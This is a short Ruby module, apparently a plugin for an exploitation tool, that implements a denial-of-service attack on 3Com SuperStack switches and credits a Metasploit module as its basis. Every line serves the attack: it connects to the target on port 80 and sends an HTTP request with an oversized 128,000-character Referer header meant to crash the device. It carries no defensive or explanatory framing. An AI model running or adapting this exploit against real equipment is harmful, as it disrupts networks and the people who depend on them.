
def tcom_ssswitch_dos_load(opt)
	opt["host"] = true
	return opt
end

def tcom_ssswitch_dos(opt)
	# 3Com SuperStack Switch DoS
	# Based on 3com_superstack_switch.rb from MSF
	buff = "A"*128000
	host = opt["host"]

	puts "[*] Connecting to the target ..."
	begin
		s = TCPSocket.new(host, 80)
	rescue
		puts "    Error connecting."
		return 0
	end
	puts "[*] Connected, sending exploit ..."
	s.write("GET / HTTP/1.0\r\nReferer: #{buff}\r\n\r\n")
	s.close()
	puts "[*] Exploit sent."
end

